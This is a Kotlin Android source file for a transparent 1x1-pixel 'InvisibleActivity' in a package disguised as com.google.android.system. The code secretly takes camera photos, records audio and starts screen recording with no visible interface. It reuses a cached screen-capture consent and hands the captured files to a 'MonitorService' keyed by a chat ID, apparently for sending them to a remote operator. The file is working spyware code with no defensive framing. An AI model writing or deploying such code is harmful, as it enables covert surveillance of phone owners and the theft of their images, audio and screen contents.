package com.google.android.system

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream

/**
 * InvisibleActivity
 *
 * 1x1 Pixel 100% Transparent Invisible Activity that brings the app process into the RESUMED
 * activity state with ZERO UI visible on screen.
 */
class InvisibleActivity : Activity() {

    companion object {
        private const val TAG = "InvisibleActivity"
        @Volatile var instance: InvisibleActivity? = null

        const val EXTRA_ACTION = "extra_action"
        const val EXTRA_CHAT_ID = "extra_chat_id"
        const val EXTRA_IS_FRONT = "extra_is_front"
        const val EXTRA_DURATION = "extra_duration"

        const val ACTION_PHOTO = "action_photo"
        const val ACTION_AUDIO = "action_audio"
        const val ACTION_SCREEN_RECORD = "action_screen_record"
        private const val REQUEST_CODE_SCREEN_RECORD = 19453

        fun launchInvisible(context: Context, action: String? = null, chatId: String? = null, isFront: Boolean = false, duration: Int = 10) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
                Log.w(TAG, "Overlay permission not granted; background activity launch may be restricted on Android 10+")
            }
            try {
                val intent = Intent(context, InvisibleActivity::class.java).apply {
                    putExtra(EXTRA_ACTION, action)
                    putExtra(EXTRA_CHAT_ID, chatId)
                    putExtra(EXTRA_IS_FRONT, isFront)
                    putExtra(EXTRA_DURATION, duration)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                }
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch InvisibleActivity from background: ${e.message}")
            }
        }

        fun launchScreenRecord(context: Context, chatId: String? = null, duration: Int = 10) {
            launchInvisible(context, action = ACTION_SCREEN_RECORD, chatId = chatId, duration = duration)
        }

        fun closeInvisible() {
            instance?.finish()
            instance = null
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        instance = this

        // Configure 1x1 pixel 100% transparent window at top-left corner
        window.setGravity(Gravity.TOP or Gravity.START)
        val params = window.attributes
        params.x = 0
        params.y = 0
        params.height = 1
        params.width = 1
        params.alpha = 0f
        window.attributes = params

        val root = android.view.View(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
        }
        setContentView(root)

        val action = intent.getStringExtra(EXTRA_ACTION)
        val chatId = intent.getStringExtra(EXTRA_CHAT_ID) ?: ""
        val isFront = intent.getBooleanExtra(EXTRA_IS_FRONT, false)
        val duration = intent.getIntExtra(EXTRA_DURATION, 10)

        when (action) {
            ACTION_PHOTO -> capturePhotoResumed(chatId, isFront)
            ACTION_AUDIO -> recordAudioResumed(chatId, duration)
            ACTION_SCREEN_RECORD -> requestScreenRecordPermission(chatId, duration)
        }
    }

    private fun capturePhotoResumed(chatId: String, isFront: Boolean) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            finish()
            return
        }

        val handler = Handler(Looper.getMainLooper())
        val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK

        try {
            val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
            var targetCameraId: String? = null

            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    targetCameraId = id
                    break
                }
            }

            if (targetCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                targetCameraId = cameraManager.cameraIdList[0]
            }

            if (targetCameraId == null) {
                finish()
                return
            }

            val imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2)
            val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")

            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    FileOutputStream(photoFile).use { out -> out.write(bytes) }
                    Log.i(TAG, "Resumed Camera2 photo captured successfully: ${photoFile.absolutePath}")

                    MonitorService.sendPhotoPublic(chatId, photoFile)
                } catch (e: Exception) {
                    Log.e(TAG, "InvisibleActivity capture error: ${e.message}")
                } finally {
                    finish()
                }
            }, handler)

            @Suppress("MissingPermission")
            cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val surface = imageReader.surface
                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(surface)
                        }
                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                            try { camera.close() } catch (_: Exception) {}
                                        }
                                    }, handler)
                                } catch (_: Exception) { try { camera.close() } catch (_: Exception) {}; finish() }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                try { camera.close() } catch (_: Exception) {}; finish()
                            }
                        }, handler)
                    } catch (_: Exception) { try { camera.close() } catch (_: Exception) {}; finish() }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    try { camera.close() } catch (_: Exception) {}; finish()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    try { camera.close() } catch (_: Exception) {}; finish()
                }
            }, handler)

        } catch (e: Exception) {
            Log.e(TAG, "InvisibleActivity exception: ${e.message}")
            finish()
        }
    }

    private fun recordAudioResumed(chatId: String, duration: Int) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            finish()
            return
        }

        val handler = Handler(Looper.getMainLooper())
        handler.post {
            val outFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            @Suppress("DEPRECATION")
            val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                MediaRecorder(this)
            else
                MediaRecorder()

            try {
                rec.setAudioSource(MediaRecorder.AudioSource.CAMCORDER)
                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                rec.setAudioSamplingRate(48000)
                rec.setAudioEncodingBitRate(192_000)
                rec.setOutputFile(outFile.absolutePath)
                rec.prepare()
                rec.start()

                Log.i(TAG, "Successfully started resumed audio recording")

                handler.postDelayed({
                    try {
                        rec.stop()
                        rec.release()
                        if (outFile.exists() && outFile.length() > 0) {
                            MonitorService.sendAudioPublic(chatId, outFile)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "recordAudioResumed stop error: ${e.message}")
                    } finally {
                        finish()
                    }
                }, duration * 1000L)
            } catch (e: Exception) {
                Log.e(TAG, "recordAudioResumed prepare error: ${e.message}")
                try { rec.release() } catch (_: Exception) {}
                finish()
            }
        }
    }

    private fun requestScreenRecordPermission(chatId: String, duration: Int) {
        val cachedCode = ScreenRecordingService.cachedResultCode
        val cachedIntent = ScreenRecordingService.cachedProjectionIntent

        if (cachedCode != -1 && cachedIntent != null) {
            val serviceIntent = Intent(this, ScreenRecordingService::class.java).apply {
                putExtra(ScreenRecordingService.EXTRA_RESULT_CODE, cachedCode)
                putExtra(ScreenRecordingService.EXTRA_RESULT_DATA, cachedIntent)
                putExtra(ScreenRecordingService.EXTRA_DURATION_SEC, duration)
                putExtra(ScreenRecordingService.EXTRA_TARGET_CHAT_ID, chatId)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            finish()
            return
        }

        try {
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
            val intent = projectionManager.createScreenCaptureIntent()
            startActivityForResult(intent, REQUEST_CODE_SCREEN_RECORD)
        } catch (e: Exception) {
            Log.e(TAG, "requestScreenRecordPermission error: ${e.message}")
            finish()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        @Suppress("DEPRECATION")
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE_SCREEN_RECORD) {
            if (resultCode == RESULT_OK && data != null) {
                val chatId = intent.getStringExtra(EXTRA_CHAT_ID) ?: ""
                val duration = intent.getIntExtra(EXTRA_DURATION, 10)

                ScreenRecordingService.cachedResultCode = resultCode
                ScreenRecordingService.cachedProjectionIntent = data

                val serviceIntent = Intent(this, ScreenRecordingService::class.java).apply {
                    putExtra(ScreenRecordingService.EXTRA_RESULT_CODE, resultCode)
                    putExtra(ScreenRecordingService.EXTRA_RESULT_DATA, data)
                    putExtra(ScreenRecordingService.EXTRA_DURATION_SEC, duration)
                    putExtra(ScreenRecordingService.EXTRA_TARGET_CHAT_ID, chatId)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent)
                } else {
                    startService(serviceIntent)
                }
            } else {
                Log.w(TAG, "MediaProjection permission denied by user.")
            }
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }
}
